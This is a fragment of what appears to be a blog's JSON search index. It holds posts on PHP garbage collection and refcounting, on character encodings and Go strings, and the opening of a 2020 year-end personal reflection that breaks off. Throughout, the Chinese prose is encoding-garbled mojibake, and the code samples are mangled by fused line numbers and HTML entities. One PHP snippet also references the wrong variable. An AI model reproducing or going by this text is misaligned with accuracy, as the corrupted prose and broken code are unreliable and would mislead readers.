åƒåœ¾å›æ”¶æœºåˆ¶","slug":"php-garbage-collection-mechanism","date":"2021-01-04T14:44:06.000Z","updated":"2021-02-03T08:32:46.856Z","comments":true,"path":"php-garbage-collection-mechanism/","link":"","permalink":"https://www.0x2beace.com/php-garbage-collection-mechanism/","excerpt":"PHP æ˜¯ä¸€é—¨æ‰˜ç®¡å‹è¯­è¨€ï¼Œåœ¨PHP ç¼–ç¨‹æ—¶ï¼Œç¨‹åºå‘˜ä¸éœ€è¦æ‰‹åŠ¨å¤„ç†å†…å­˜èµ„æºçš„åˆ†é…å’Œé‡Šæ”¾ï¼Œè¿™å°±æ„å‘³ç€ PHP æœ¬èº«å®ç°äº†åƒåœ¾å›æ”¶æœºåˆ¶ï¼ˆGarbage Collectionï¼‰ã€‚","text":"PHP æ˜¯ä¸€é—¨æ‰˜ç®¡å‹è¯­è¨€ï¼Œåœ¨PHP ç¼–ç¨‹æ—¶ï¼Œç¨‹åºå‘˜ä¸éœ€è¦æ‰‹åŠ¨å¤„ç†å†…å­˜èµ„æºçš„åˆ†é…å’Œé‡Šæ”¾ï¼Œè¿™å°±æ„å‘³ç€ PHP æœ¬èº«å®ç°äº†åƒåœ¾å›æ”¶æœºåˆ¶ï¼ˆGarbage Collectionï¼‰ã€‚ åƒåœ¾å›æ”¶æœºåˆ¶æ˜¯ä»€ä¹ˆï¼Ÿ åƒåœ¾å›æ”¶æ˜¯ä¸€ç§è‡ªåŠ¨çš„å­˜å‚¨å™¨ç®¡ç†æœºåˆ¶ï¼Œå½“æŸä¸ªç¨‹åºå ç”¨çš„ä¸€éƒ¨åˆ†å†…å­˜ç©ºé—´ä¸å†è¢«è¿™ä¸ªç¨‹åºæ‰€è®¿é—®æ—¶ï¼Œè¿™ä¸ªç¨‹åºä¼šå€ŸåŠ©åƒåœ¾å›æ”¶ç®—æ³•è‡ªåŠ¨å‘æ“ä½œç³»ç»Ÿå½’è¿˜è¿™éƒ¨åˆ†çš„å†…å­˜ç©ºé—´ã€‚ PHP å¼•ç”¨è®¡æ•°å®šä¹‰ä¸€ä¸ªPHP å˜é‡å¦‚ä¸‹ï¼š 1234&lt;?php$str &#x3D; &quot;boo&quot;;$str_bak &#x3D; $var;unset($str); ä¸Šé¢è¿™å‡ è¡Œä»£ç åˆ†åˆ«åšäº†å¦‚ä¸‹äº‹æƒ…ï¼š ç¬¬ä¸€è¡Œä»£ç åˆ›å»ºäº†ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡ï¼Œç”³è¯·äº†ä¸€ä¸ªå¤§å°ä¸º ä¸‰ä¸ªå­—èŠ‚çš„å†…å­˜ç©ºé—´ï¼Œä¿å­˜äº†å­—ç¬¦ä¸² boo å’Œä¸€ä¸ª NULL(\\0)çš„ç»“å°¾ã€‚ ç¬¬äºŒè¡Œä»£ç å®šä¹‰äº†ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²å˜é‡ï¼Œå¹¶å°†å˜é‡strçš„å€¼å¤åˆ¶ç»™äº†è¿™ä¸ªæ–°çš„å˜é‡ã€‚ ç¬¬ä¸‰è¡Œ unset æ‰äº†å˜é‡ str è¿™æ ·çš„ä»£ç åœ¨å¾ˆå¸¸è§ï¼Œå¦‚æœPHP å¯¹äºæ¯ä¸€ä¸ªå˜é‡èµ‹å€¼éƒ½é‡æ–°åˆ†é…å†…å­˜ï¼Œcopy æ•°æ®çš„è¯ï¼Œé‚£ä¹ˆä¸Šé¢çš„é‚£æ®µä»£ç å°±éœ€è¦å…±ç”³è¯·å…­ä¸ªå­—èŠ‚çš„å†…å­˜ç©ºé—´ï¼Œè€Œæˆ‘ä»¬ä¹Ÿå¾ˆå®¹æ˜“çœ‹å‡ºæ¥ï¼Œå…¶å®å®Œå…¨æ²¡æœ‰å¿…è¦ç”³è¯·ä¸¤ä»½ç©ºé—´ã€‚ PHPä¸­çš„å˜é‡æ˜¯ç”¨ä¸€ä¸ªå­˜å‚¨åœ¨ symbol_table ä¸­çš„ç¬¦å·åï¼Œå¯¹åº”ä¸€ä¸ª zval å˜é‡å®¹å™¨æ¥å®ç°çš„ï¼Œæ¯”å¦‚å¯¹äºä¸Šé¢çš„ç¬¬ä¸€è¡Œä»£ç ï¼Œä¼šåœ¨ symbol_table ä¸­å­˜å‚¨ä¸€ä¸ªå€¼ str, å¯¹åº”çš„æœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ä¸€ä¸ª zvalç»“æ„ï¼Œå˜é‡å€¼ boo ä¿å­˜åœ¨è¿™ä¸ªå˜é‡å®¹å™¨ä¸­ï¼Œæ‰€ä»¥ä¸éš¾æƒ³è±¡ï¼Œå¯¹äºä¸Šé¢çš„ä»£ç æ¥è¯´ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥è®© str å’Œ str_bak å¯¹åº”çš„æŒ‡é’ˆéƒ½æŒ‡å‘åŒä¸€ä¸ªå˜é‡å®¹å™¨å°±å¯ä»¥äº†ã€‚ PHP ä¹Ÿæ˜¯è¿™æ ·åšçš„ï¼Œè¿™æ˜¯å°±éœ€è¦ä»‹ç» zvalå˜é‡å®¹å™¨çš„ç»“æ„äº†ã€‚ æ¯ä¸ªå˜é‡å­˜åœ¨ä¸€ä¸ªå«åšzvalçš„å˜é‡å®¹å™¨ä¸­ã€‚ä¸€ä¸ªzvalå˜é‡å®¹å™¨ï¼Œé™¤äº†åŒ…å«å˜é‡çš„ç±»å‹å’Œå€¼ï¼Œè¿˜åŒ…æ‹¬ä¸¤ä¸ªå­—èŠ‚çš„é¢å¤–ä¿¡æ¯ï¼š is_refï¼šbool å€¼ï¼Œç”¨æ¥æ ‡ç¤ºè¿™ä¸ªå˜é‡æ˜¯å¦å±äºå¼•ç”¨é›†åˆï¼ˆreference_setï¼‰ã€‚é€šè¿‡è¿™ä¸ªå­—èŠ‚ï¼ŒPHP å¼•æ“æ‰èƒ½æŠŠæ™®é€šå˜é‡å’Œå¼•ç”¨å˜é‡åŒºåˆ†å¼€æ¥ã€‚ refcountï¼šç”¨ä»¥è¡¨ç¤ºæŒ‡å‘è¿™ä¸ª zval å˜é‡å®¹å™¨çš„å˜é‡ä¸ªæ•°ã€‚ 1. æŸ¥çœ‹å†…éƒ¨ç»“æ„å½“ä¸€ä¸ªå˜é‡è¢«èµ‹å€¼æ—¶ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªzvalå˜é‡å®¹å™¨ï¼š 123&lt;?php$str &#x3D; &quot;hello, php&quot;;xdebug_debug_zval(&#39;str&#39;); åœ¨ PHP ä¸­å¯ä»¥é€šè¿‡ xdebug æ‰©å±•ä¸­æä¾›çš„æ–¹æ³•xdebug_debug_zval()æ¥æŸ¥çœ‹å˜é‡çš„è®¡æ•°å˜åŒ–ã€‚ è¾“å‡ºç»“æœ 1str:(refcount&#x3D;1, is_ref&#x3D;0)string &#39;hello, php&#39; (length&#x3D;10) 2. å¢åŠ å¼•ç”¨æ¬¡æ•°æŠŠä¸€ä¸ªå˜é‡èµ‹å€¼ç»™å¦ä¸€ä¸ªå˜é‡å°†å¢åŠ å¼•ç”¨æ¬¡æ•°ï¼ˆrefcount + 1ï¼‰ï¼š 123$str &#x3D; &quot;hello, php&quot;;$str2 &#x3D; $strxdebug_debug_zval(&#39;str&#39;); è¾“å‡ºç»“æœï¼š 1str:(refcount&#x3D;2, is_ref&#x3D;0)string &#39;hello, php&#39; (length&#x3D;10) è¿™æ—¶ï¼Œå¼•ç”¨æ¬¡æ•°æ˜¯ 2ï¼Œè¿™æ˜¯å› ä¸ºåŒä¸€ä¸ªå˜é‡å®¹å™¨è¢«å˜é‡a å’Œå˜é‡b å…³è”ï¼Œå½“ä»»ä½•å…³è”åˆ°çš„æŸä¸ªå˜é‡å®¹å™¨ç¦»å¼€å®ƒçš„ä½œç”¨åŸŸï¼ˆæ¯”å¦‚ï¼šå‡½æ•°æ‰§è¡Œç»“æŸï¼‰ï¼Œæˆ–è€…å¯¹å˜é‡è°ƒç”¨äº† unset() å‡½æ•°ï¼Œrefcountçš„å€¼å°±ä¼š -1ï¼Œå½“æ²¡å¿…è¦æ—¶ï¼ŒPHP ä¸ä¼šå†å»å¤åˆ¶å·²ç”Ÿæˆçš„å˜é‡å®¹å™¨ï¼Œå˜é‡å®¹å™¨åœ¨refcountçš„å€¼å˜ä¸º 0 æ—¶ï¼Œå°±ä¼šè¢«é”€æ¯ã€‚ 3. æ•°ç»„å‹çš„å˜é‡123&lt;?php$arr &#x3D; [&#39;a&#39;&#x3D;&gt;&#39;hello&#39;, &#39;b&#39;&#x3D;&gt;&#39;php&#39;];xdebug_debug_zval(&#39;arr&#39;); è¾“å‡ºç»“æœï¼š 12345arr:(refcount&#x3D;2, is_ref&#x3D;0)array (size&#x3D;2) &#39;a&#39; &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)string &#39;hello&#39; (length&#x3D;5) &#39;b&#39; &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)string &#39;php&#39; (length&#x3D;3) 4. å¼•ç”¨èµ‹å€¼1234&lt;?php$str &#x3D; &quot;hello, php&quot;;$str_bak &#x3D; &amp;$str;xdebug_debug_zval(&#39;str&#39;); è¾“å‡ºç»“æœï¼š 1str:(refcount&#x3D;2, is_ref&#x3D;1)string &#39;hello, php&#39; (length&#x3D;10) is_ref = 1è¡¨ç¤ºè¢«å¼•ç”¨æ¬¡æ•°ä¸º 1ã€‚ 5. é”€æ¯å˜é‡12345678&lt;?php$a &#x3D; &quot;new string&quot;;$c &#x3D; $b &#x3D; $a;xdebug_debug_zval( &#39;a&#39; );unset( $b, $c );xdebug_debug_zval( &#39;a&#39; );unset( $a);xdebug_debug_zval( &#39;a&#39; ); è¾“å‡ºç»“æœï¼š 123a:(refcount&#x3D;3, is_ref&#x3D;0)string &#39;new string&#39; (length&#x3D;10)a:(refcount&#x3D;1, is_ref&#x3D;0)string &#39;new string&#39; (length&#x3D;10)a: no such symbol å¯ä»¥çœ‹åˆ°å½“é”€æ¯å˜é‡aä¹‹åï¼Œä¸ä¹‹åŒ…å«ç±»å‹çš„å€¼å’Œå˜é‡å®¹å™¨å°±ä¼šä»å†…å­˜ä¸­åˆ é™¤ã€‚ æµ‹è¯•åƒåœ¾å›æ”¶æœºåˆ¶ä¸‹é¢ç”¨ä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„å†…å­˜æ³„éœ²ä¾‹å­æ¥æµ‹è¯•åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œé€šè¿‡åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¸­çš„ä¸€ä¸ªå±æ€§è¢«è®¾ç½®ä¸ºå¯¹è±¡æœ¬èº«ï¼Œåœ¨ä¸‹ä¸€ä¸ªå¾ªç¯ï¼ˆiterationï¼‰ä¸­ï¼Œå½“è„šæœ¬ä¸­çš„å˜é‡è¢«é‡æ–°èµ‹å€¼æ—¶ï¼Œå°±ä¼šå‘ç”Ÿå†…å­˜æ³„æ¼ã€‚ 12345678910111213&lt;?phpclass Foo&#123; public $var &#x3D; &#39;3.1415962654&#39;;&#125;for ( $i &#x3D; 0; $i &lt;&#x3D; 1000000; $i++ )&#123; $a &#x3D; new Foo; $a-&gt;self &#x3D; $a;&#125;echo memory_get_peak_usage(), &quot;\\n&quot;; ä»¥æˆ‘æœ¬åœ°çš„æœºå™¨ä¸ºä¾‹ï¼Œåˆ†åˆ«åœ¨æ‰“å¼€/å…³é—­åƒåœ¾å›æ”¶æœºåˆ¶ï¼ˆé€šè¿‡é…ç½® zend.enable_gcå®ç°ï¼‰çš„æƒ…å†µä¸‹è¿è¡Œè„šæœ¬ï¼Œå¹¶è®°å½•æ—¶é—´ã€‚ 1234567$ time php -dzend.enable_gc&#x3D;0 -dmemory_limit&#x3D;-1 -n get_memory.php440776744php -dzend.enable_gc&#x3D;0 -dmemory_limit&#x3D;-1 -n 0.22s user 0.23s system 39% cpu 1.145 total$ time php -dzend.enable_gc&#x3D;1 -dmemory_limit&#x3D;-1 -n get_memory.php4839240php -dzend.enable_gc&#x3D;1 -dmemory_limit&#x3D;-1 -n 0.42s user 0.03s system 76% cpu 0.588 total è¿™ä¸ªæµ‹è¯•å¹¶ä¸èƒ½ä»£è¡¨çœŸå®åº”ç”¨ç¨‹åºçš„æƒ…å†µï¼Œä½†æ˜¯å®ƒçš„ç¡®æ˜¾ç¤ºäº†æ–°çš„åƒåœ¾å›æ”¶æœºåˆ¶åœ¨å†…å­˜å ç”¨æ–¹é¢çš„å¥½å¤„ã€‚è€Œä¸”åœ¨æ‰§è¡Œä¸­å‡ºç°æ›´å¤šçš„å¾ªç¯å¼•ç”¨å˜é‡æ—¶ï¼Œå†…å­˜èŠ‚çœä¼šæ›´å¤šã€‚ åƒåœ¾å›æ”¶ç›¸å…³é…ç½®å¯ä»¥é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶ php.ini ä¸­çš„ zend.enable_gc æ¥æ‰“å¼€æˆ–å…³é—­ PHP çš„åƒåœ¾å›æ”¶æœºåˆ¶ã€‚ åˆšå¥½å€Ÿç€PHP çš„åƒåœ¾å›æ”¶è¿™ä¸ªä¸»é¢˜è§£é‡Šä¸€ä¸ªé—®é¢˜ï¼šPHP æ˜¯å¦å¯ä»¥å¸¸é©»å†…å­˜ï¼Ÿ ç­”æ¡ˆæ˜¯ï¼šä¼ ç»Ÿçš„PHP æ— æ³•ä»¥å¸¸é©»å†…å­˜çš„æ–¹å¼è¿è¡Œã€‚ è¿™æ˜¯å› ä¸ºPHP æ˜¯ä¸€ç§è§£é‡Šå‹è„šæœ¬è¯­è¨€ï¼Œè¿™ç§è¿è¡Œæœºåˆ¶ä½¿å¾—æ¯ä¸ªPHP é¡µé¢è§£é‡Šæ‰§è¡Œå®Œä¹‹åï¼Œæ‰€æœ‰èµ„æºéƒ½è¢«å›æ”¶æ‰äº†ã€‚ ä¸è¿‡å¥½åœ¨Swoole çš„å‡ºç°ä¸ºPHP å¼¥è¡¥äº†è¿™ä¸€ç¼ºé™·ï¼ˆè¿™é‡Œç”¨ç¼ºé™·è¿™ä¸ªè¯å¹¶ä¸åˆé€‚ï¼Œæ¯•ç«Ÿæ¯ä¸€ç§è¯­è¨€å·¥å…·åº”è¯¥å°½å¯èƒ½æ‰¬é•¿é¿çŸ­ï¼‰ã€‚ å‚è€ƒé“¾æ¥ PHPäºŒåä¸€é—®ï¼šPHPçš„åƒåœ¾å›æ”¶æœºåˆ¶ å¼•ç”¨è®¡æ•°åŸºæœ¬çŸ¥è¯†è§£é‡Šåƒåœ¾å›æ”¶æœºåˆ¶","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"å­—ç¬¦ä¸²ä¸ç¼–ç ","slug":"string-and-encoding","date":"2021-01-03T15:20:47.000Z","updated":"2023-02-18T03:28:33.606Z","comments":true,"path":"string-and-encoding/","link":"","permalink":"https://www.0x2beace.com/string-and-encoding/","excerpt":"å› ä¸ºè®¡ç®—æœºåªèƒ½å¤„ç†æ•°å­—ï¼Œå¦‚æœéœ€è¦å¤„ç†æ–‡æœ¬ï¼Œå°±éœ€è¦å…ˆå°†æ–‡æœ¬è½¬æ¢ä¸ºæ•°å­—æ‰èƒ½å¤„ç†ã€‚æœ€æ—©çš„è®¡ç®—æœºåœ¨è®¾è®¡æ—¶é‡‡ç”¨8ä¸ªæ¯”ç‰¹ï¼ˆbitï¼‰ä½œä¸ºä¸€ä¸ªå­—èŠ‚ï¼ˆbyteï¼‰ï¼Œæ‰€ä»¥ï¼Œä¸€ä¸ªå­—èŠ‚èƒ½è¡¨ç¤ºçš„æœ€å¤§çš„æ•´æ•°å°±æ˜¯255ï¼ˆäºŒè¿›åˆ¶ 11111111=åè¿›åˆ¶255 ï¼‰ã€‚","text":"å› ä¸ºè®¡ç®—æœºåªèƒ½å¤„ç†æ•°å­—ï¼Œå¦‚æœéœ€è¦å¤„ç†æ–‡æœ¬ï¼Œå°±éœ€è¦å…ˆå°†æ–‡æœ¬è½¬æ¢ä¸ºæ•°å­—æ‰èƒ½å¤„ç†ã€‚æœ€æ—©çš„è®¡ç®—æœºåœ¨è®¾è®¡æ—¶é‡‡ç”¨8ä¸ªæ¯”ç‰¹ï¼ˆbitï¼‰ä½œä¸ºä¸€ä¸ªå­—èŠ‚ï¼ˆbyteï¼‰ï¼Œæ‰€ä»¥ï¼Œä¸€ä¸ªå­—èŠ‚èƒ½è¡¨ç¤ºçš„æœ€å¤§çš„æ•´æ•°å°±æ˜¯255ï¼ˆäºŒè¿›åˆ¶ 11111111=åè¿›åˆ¶255 ï¼‰ã€‚ ç”±äºè®¡ç®—æœºæ˜¯ç¾å›½äººå‘æ˜çš„ï¼Œå› æ­¤ï¼Œæœ€æ—©åªæœ‰127ä¸ªå­—ç¬¦è¢«ç¼–ç åˆ°è®¡ç®—æœºé‡Œï¼Œä¹Ÿå°±æ˜¯å¤§å°å†™è‹±æ–‡å­—æ¯ã€æ•°å­—å’Œä¸€äº›ç¬¦å·ï¼Œè¿™ä¸ªç¼–ç è¡¨è¢«ç§°ä¸ºASCIIç¼–ç ã€‚ ä½†æ˜¯è¦å¤„ç†ä¸­æ–‡æ˜¾ç„¶ä¸€ä¸ªå­—èŠ‚æ˜¯ä¸å¤Ÿçš„ï¼Œè‡³å°‘éœ€è¦ä¸¤ä¸ªå­—èŠ‚ï¼Œè€Œä¸”è¿˜ä¸èƒ½å’ŒASCIIç¼–ç å†²çªï¼Œæ‰€ä»¥ï¼Œä¸­å›½åˆ¶å®šäº†GB2312ç¼–ç ï¼Œç”¨æ¥æŠŠä¸­æ–‡ç¼–è¿›å»ã€‚ å¯ä»¥æƒ³åˆ°çš„æ˜¯ï¼Œå…¨ä¸–ç•Œæœ‰ä¸Šç™¾ç§è¯­è¨€ï¼Œå„å›½æœ‰å„å›½çš„æ ‡å‡†ï¼Œå°±ä¼šä¸å¯é¿å…åœ°å‡ºç°å†²çªï¼Œç»“æœå°±æ˜¯ç¼–ç æ–¹å¼å’Œè§£ç æ–¹å¼ä¸åŒï¼Œå°±ä¼šå¯¼è‡´ä¹±ç ã€‚ å› æ­¤ï¼ŒUnicodeå­—ç¬¦é›†åº”è¿è€Œç”Ÿã€‚UnicodeæŠŠæ‰€æœ‰è¯­è¨€éƒ½ç»Ÿä¸€åˆ°ä¸€å¥—ç¼–ç é‡Œï¼Œè¿™æ ·å°±ä¸ä¼šå†æœ‰ä¹±ç é—®é¢˜äº†ã€‚ ä¸è¿‡æ–°çš„é—®é¢˜å› æ­¤åˆå‡ºç°äº†ï¼šå¦‚æœç»Ÿä¸€æˆ Unicode ç¼–ç ï¼Œä¹±ç é—®é¢˜è™½ç„¶æ˜¯ä»æ­¤æ¶ˆå¤±äº†ï¼Œä½†æ˜¯ï¼Œå¦‚æœä½ å†™çš„æ–‡æœ¬åŸºæœ¬ä¸Šå…¨éƒ¨æ˜¯è‹±æ–‡çš„è¯ï¼Œç”¨Unicodeç¼–ç æ¯”ASCIIç¼–ç éœ€è¦å¤šä¸€å€çš„å­˜å‚¨ç©ºé—´ï¼Œåœ¨å­˜å‚¨å’Œä¼ è¾“ä¸Šå°±ååˆ†ä¸åˆ’ç®—ã€‚ æ‰€ä»¥ï¼Œæœ¬ç€èŠ‚çº¦çš„ç²¾ç¥ï¼Œåˆå‡ºç°äº†æŠŠUnicodeç¼–ç è½¬åŒ–ä¸ºâ€œå¯å˜é•¿ç¼–ç â€çš„UTF-8ç¼–ç ã€‚UTF-8ç¼–ç æŠŠä¸€ä¸ªUnicodeå­—ç¬¦æ ¹æ®ä¸åŒçš„æ•°å­—å¤§å°ç¼–ç æˆ1-6ä¸ªå­—èŠ‚ï¼Œå¸¸ç”¨çš„è‹±æ–‡å­—æ¯è¢«ç¼–ç æˆ1ä¸ªå­—èŠ‚ï¼Œæ±‰å­—é€šå¸¸æ˜¯3ä¸ªå­—èŠ‚ï¼Œåªæœ‰å¾ˆç”Ÿåƒ»çš„å­—ç¬¦æ‰ä¼šè¢«ç¼–ç æˆ4-6ä¸ªå­—èŠ‚ã€‚ ASCIIã€Unicodeå’ŒUTF-8 ä¸‰è€…çš„å…³ç³»æ˜¯ï¼š Unicode æ˜¯ä¸€ç§åŒ…å«æ‰€æœ‰è¯­è¨€çš„å­—ç¬¦é›†ç¼–ç ï¼ˆæ›¿ä»£ASCIIç¼–ç ï¼‰ UTF-8 æ˜¯ Unicode çš„å®ç°æ–¹å¼ä¹‹ä¸€ å­—ç¬¦ç¼–ç åœ¨è®¡ç®—æœºä¸­çš„å·¥ä½œæ–¹å¼åœ¨è®¡ç®—æœºå†…å­˜ä¸­ï¼Œç»Ÿä¸€ä½¿ç”¨Unicodeç¼–ç ï¼Œå½“éœ€è¦ä¿å­˜åˆ°ç¡¬ç›˜æˆ–è€…éœ€è¦ä¼ è¾“çš„æ—¶å€™ï¼Œå°±è½¬æ¢ä¸ºUTF-8ç¼–ç ã€‚ ç”¨è®°äº‹æœ¬ç¼–è¾‘çš„æ—¶å€™ï¼Œä»æ–‡ä»¶è¯»å–çš„UTF-8å­—ç¬¦è¢«è½¬æ¢ä¸ºUnicodeå­—ç¬¦åˆ°å†…å­˜é‡Œï¼Œç¼–è¾‘å®Œæˆåï¼Œä¿å­˜çš„æ—¶å€™å†æŠŠUnicodeè½¬æ¢ä¸ºUTF-8ä¿å­˜åˆ°æ–‡ä»¶ï¼š æµè§ˆç½‘é¡µçš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ä¼šæŠŠåŠ¨æ€ç”Ÿæˆçš„Unicodeå†…å®¹è½¬æ¢ä¸ºUTF-8å†ä¼ è¾“åˆ°æµè§ˆå™¨ï¼š æ‰€ä»¥ä½ çœ‹åˆ°å¾ˆå¤šç½‘é¡µçš„æºç ä¸Šä¼šæœ‰ç±»ä¼¼&lt;meta charset=&quot;UTF-8&quot; /&gt;çš„ä¿¡æ¯ï¼Œè¡¨ç¤ºè¯¥ç½‘é¡µæ­£æ˜¯ç”¨çš„UTF-8ç¼–ç ã€‚ Go è¯­è¨€çš„å­—ç¬¦ä¸²Go è¯­è¨€çš„å­—ç¬¦ä¸²ä¸å…¶ä»–ç¼–ç¨‹è¯­è¨€çš„å·®å¼‚ï¼š string æ˜¯æ•°æ®ç±»å‹ï¼Œä¸æ˜¯å¼•ç”¨æˆ–è€…æŒ‡é’ˆç±»å‹ï¼ˆå…¶é›¶å€¼ä¸æ˜¯ç©ºï¼Œæ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼‰ string æ˜¯åªè¯»çš„ byte sliceï¼Œlenå‡½æ•°è·å–çš„æ˜¯å®ƒæ‰€åŒ…å«çš„ byteæ•° string çš„ byte æ•°ç»„å¯ä»¥å­˜æ”¾ä»»ä½•æ•°æ®ï¼ˆäºŒè¿›åˆ¶ï¼‰ é€šè¿‡ä¸€ä¸ªå®é™…ä¾‹å­æ¥ç†è§£Go çš„stringã€Unicodeã€UTF8ï¼š 1234567891011121314151617package mainimport &quot;testing&quot;func TestString(t *testing.T) &#123; var s3 &#x3D; &quot;ä¸­&quot; &#x2F;&#x2F; rune è¿™ä¸ªæ•°æ®ç±»å‹å¯ä»¥å–å‡ºå­—ç¬¦ä¸²ä¸­çš„ Unicode ç¼–ç  r :&#x3D; []rune(s3) &#x2F;&#x2F; byte è¿™ä¸ªæ•°æ®ç±»å‹å¯ä»¥å–å‡ºå­—ç¬¦ä¸²çš„ UTF8 å­˜å‚¨ b :&#x3D; []byte(s3) t.Log(b) &#x2F;&#x2F; [228 184 173] t.Logf(&quot;ä¸­ çš„Unicode ç¼–ç ï¼š%x&quot;, r[0]) t.Logf(&quot;ä¸­ çš„UTF8 å­˜å‚¨ï¼š%X&quot;, s3) &#x2F;&#x2F; [0xE4, 0xB8, 0xAD]&#125; å­—ç¬¦ ä¸­ å­—åœ¨ Unicode ä¸­çš„ç¼–ç æ˜¯0x4E2Dï¼Œå®ƒçš„ç‰©ç†å­˜å‚¨å½¢å¼ä¾èµ–äº UTF8è§„åˆ™ï¼Œå®ƒåœ¨å†…å­˜è¢«å­˜å‚¨ä¸ºäº†E4B8ADï¼Œæ”¾åœ¨ string å¯¹åº”çš„ byteåˆ‡ç‰‡ä¸­ï¼Œåˆ†åˆ«å¯¹åº”ä¸‰ä¸ª byteï¼š[0xE4, 0xB8, 0xAD]ã€‚ å…¶ä»–é—®é¢˜ åœ¨æˆ‘ä»¬çš„æ—¥å¸¸ç”Ÿæ´»ä¸­ç”¨åˆ°çš„æ˜¯åè¿›åˆ¶ï¼Œè®¡ç®—æœºç”¨çš„æ˜¯äºŒè¿›åˆ¶ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¿˜ä¼šå‡ºç°åå…­è¿›åˆ¶å‘¢ï¼Ÿ è¿™æ˜¯å› ä¸ºä½¿ç”¨äºŒè¿›åˆ¶è¡¨ç¤ºæ•°æ®å¤ªé•¿äº†ï¼Œå¯è¯»æ€§ååˆ†å·®ï¼Œæ­£å¥½åå…­æ˜¯äºŒçš„å››æ¬¡æ–¹ï¼Œæ‰€ä»¥ä¸€ä½åå…­è¿›åˆ¶å¯ä»¥è¡¨ç¤ºå››ä½äºŒè¿›åˆ¶ã€‚ å‚è€ƒè¿æ¥ å­—ç¬¦ä¸²å’Œç¼–ç â€”â€”å»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™ å­—ç¬¦ç¼–ç ç¬”è®°ï¼šASCIIï¼ŒUnicode å’Œ UTF-8","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"äºŒé›¶äºŒé›¶å¹´ç»ˆæ€»ç»“","slug":"2020-year-end-summary","date":"2020-12-31T16:17:16.000Z","updated":"2021-03-02T14:22:00.544Z","comments":true,"path":"2020-year-end-summary/","link":"","permalink":"https://www.0x2beace.com/2020-year-end-summary/","excerpt":"å›é¡¾æ•´ä¸ªäºŒé›¶äºŒé›¶å¹´äºæˆ‘è€Œè¨€æœ€å¤§çš„æ”¶è·å¤§æ¦‚æ˜¯ï¼šæ‰¾åˆ°äº†æ–¹å‘ï¼ŒçŸ¥é“è‡ªå·±è¯¥åšä»€ä¹ˆäº†ã€‚","text":"å›é¡¾æ•´ä¸ªäºŒé›¶äºŒé›¶å¹´äºæˆ‘è€Œè¨€æœ€å¤§çš„æ”¶è·å¤§æ¦‚æ˜¯ï¼šæ‰¾åˆ°äº†æ–¹å‘ï¼ŒçŸ¥é“è‡ªå·±è¯¥åšä»€ä¹ˆäº†ã€‚ åœ¨æ­¤å‰ï¼Œæˆ‘ä¸€ç›´å¤„äºâ€œä¸ç¡®å®šâ€çŠ¶æ€ï¼Œä¸ç¡®å®šæ˜¯å¦è¦é€‰æ‹©è¿™æ¡è·¯ï¼Œä¸ç¡®å®šæ˜¯å¦è¶³å¤Ÿçƒ­çˆ±ï¼Œä¸ç¡®å®šæ˜¯å¦èƒ½åšæŒä¸‹å»ã€‚ è€Œæ­¤åˆ»ï¼Œæˆ‘å¾ˆæ¸…æ™°åœ°çŸ¥é“è‡ªå·±è¯¥åšäº›ä»€ä¹ˆï¼Œæƒ³è¦äº›ä»€ä¹ˆã€‚ è¿™ç¯‡åšå®¢ä¸»è¦ä»ç”Ÿæ´»ã€å·¥ä½œã€å­¦ä¹ ã€æ€è€ƒã€åˆ†äº«ä»¥åŠæœªæ¥è¿™å‡ ä¸ªæ–¹é¢ç®€å•æ€»ç»“ä¸‹è¿‡å»çš„ä¸€å¹´ã€‚ å…³äºç”Ÿæ´»è¿™éƒ¨åˆ†æ”¾åœ¨è¿™é‡Œå…¶å®æœ‰äº›å¤šä½™ï¼Œå³ä¾¿å¦‚æ­¤ï¼Œæˆ‘è¿˜æ˜¯æƒ³è¡¨è¾¾å‡ºæ¥ï¼Œä¹Ÿè®¸ä¼šæœ‰å…±é¸£è€…å‘¢ã€‚ ç”Ÿæ´»ä¸­çš„æˆ‘ï¼Œæ—¥å¸¸å¾ˆç®€å•ã€‚ç»å¤§éƒ¨åˆ†æ—¶é—´éƒ½æ˜¯å®…åœ¨å®¶é‡Œï¼Œä¸å–œæ¬¢å¤–å‡ºæˆ–è€…è¯´ä¸æ“…é•¿ç¤¾äº¤ã€‚ä»¥å‰å¾ˆå°‘ä¼šè§‰å¾—è¿™æ ·çš„æ—¥å­æ˜¯å¦ä¼šå¤ªå­¤ç‹¬äº†ã€‚ ä¸çŸ¥ä¸ºä½•ï¼Œä»Šå¹´è¿™ç§æ„Ÿè§‰å°¤å…¶å¼ºçƒˆã€‚ ç”Ÿæ´»åœ¨è¿™ä¸ªæ—¶ä»£çš„æˆ‘ä»¬ä¼¼ä¹éƒ½å¤ªå­¤ç‹¬äº†ï¼Œæ— è®ºæ˜¯ä»€ä¹ˆç¤¾ä¼šé˜¶å±‚ã€ä»€ä¹ˆèŒä¸šèƒŒæ™¯ã€ä»€ä¹ˆæ€§åˆ«çŠ¶æ€ï¼Œäººå°±æ˜¯å­¤ç‹¬çš„ã€‚ æ¸´æœ›äº¤æµï¼Œå´æ‰¾ä¸åˆ°åˆé€‚çš„äºº; æ¸´æœ›è¢«çˆ±ï¼Œå´å®³æ€•è¢«ä¼¤å®³; 